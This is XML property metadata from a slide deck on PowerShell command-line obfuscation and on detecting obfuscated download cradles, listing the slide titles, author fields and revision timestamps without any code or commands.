      <vt:lpstr>Obscure Token Obfuscation</vt:lpstr>
      <vt:lpstr>Obscure Token Obfuscation</vt:lpstr>
      <vt:lpstr>Obscure Token Obfuscation</vt:lpstr>
      <vt:lpstr>Obscure Token Obfuscation</vt:lpstr>
      <vt:lpstr>Obscure Token Obfuscation</vt:lpstr>
      <vt:lpstr>Obscure Token Obfuscation</vt:lpstr>
      <vt:lpstr>Obscure Token Obfuscation</vt:lpstr>
      <vt:lpstr>Obscure Token Obfuscation</vt:lpstr>
      <vt:lpstr>Obscure Token Obfuscation</vt:lpstr>
      <vt:lpstr>Obscure Token Obfuscation</vt:lpstr>
      <vt:lpstr>Obscure Token Obfuscation</vt:lpstr>
      <vt:lpstr>Obscure Token Obfuscation</vt:lpstr>
      <vt:lpstr>Obscure Token Obfuscation</vt:lpstr>
      <vt:lpstr>Obscure Token Obfuscation</vt:lpstr>
      <vt:lpstr>Obscure Token Obfuscation</vt:lpstr>
      <vt:lpstr>Obscure Token Obfuscation</vt:lpstr>
      <vt:lpstr>Obscure Token Obfuscation</vt:lpstr>
      <vt:lpstr>Obscure Token Obfuscation</vt:lpstr>
      <vt:lpstr>Obscure Token Obfuscation</vt:lpstr>
      <vt:lpstr>Obscure Token Obfuscation</vt:lpstr>
      <vt:lpstr>Obscure Token Obfuscation</vt:lpstr>
      <vt:lpstr>MOAR! Crafting Cryptic Cradles</vt:lpstr>
      <vt:lpstr>Obscure Invocation Syntaxes</vt:lpstr>
      <vt:lpstr>Obscure Invocation Syntaxes</vt:lpstr>
      <vt:lpstr>Obscure Invocation Syntaxes</vt:lpstr>
      <vt:lpstr>Obscure Invocation Syntaxes</vt:lpstr>
      <vt:lpstr>Obscure Invocation Syntaxes</vt:lpstr>
      <vt:lpstr>Obscure Invocation Syntaxes</vt:lpstr>
      <vt:lpstr>Obscure Invocation Syntaxes</vt:lpstr>
      <vt:lpstr>Obscure Invocation Syntaxes</vt:lpstr>
      <vt:lpstr>Obscure Invocation Syntaxes</vt:lpstr>
      <vt:lpstr>Obscure Invocation Syntaxes</vt:lpstr>
      <vt:lpstr>Obscure Invocation Syntaxes</vt:lpstr>
      <vt:lpstr>Obscure Invocation Syntaxes</vt:lpstr>
      <vt:lpstr>Outline</vt:lpstr>
      <vt:lpstr>Detecting Cryptic Cradles</vt:lpstr>
      <vt:lpstr>Detecting Cryptic Cradles</vt:lpstr>
      <vt:lpstr>Detecting Cryptic Cradles</vt:lpstr>
      <vt:lpstr>Detecting Cryptic Cradles</vt:lpstr>
      <vt:lpstr>Detecting Cryptic Cradles</vt:lpstr>
      <vt:lpstr>Detecting Cryptic Cradles</vt:lpstr>
      <vt:lpstr>Detecting Cryptic Cradles</vt:lpstr>
      <vt:lpstr>Detecting Cryptic Cradles</vt:lpstr>
      <vt:lpstr>Detecting Cryptic Cradles</vt:lpstr>
      <vt:lpstr>Outline</vt:lpstr>
      <vt:lpstr>Invoke-CradleCrafter Demo</vt:lpstr>
      <vt:lpstr>Closing Comments</vt:lpstr>
      <vt:lpstr>Closing Comments</vt:lpstr>
      <vt:lpstr>Credit Where Credit Is Due</vt:lpstr>
      <vt:lpstr>Thank You! Questions?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PowerShell Command Line Argument Obfuscation Techniques</dc:title>
  <dc:creator>limited_user</dc:creator>
  <cp:lastModifiedBy>me</cp:lastModifiedBy>
  <cp:revision>627</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2016-03-04T19:00:09Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2017-06-12T17:17:06Z</dcterms:modified>
</cp:coreProperties>
</file>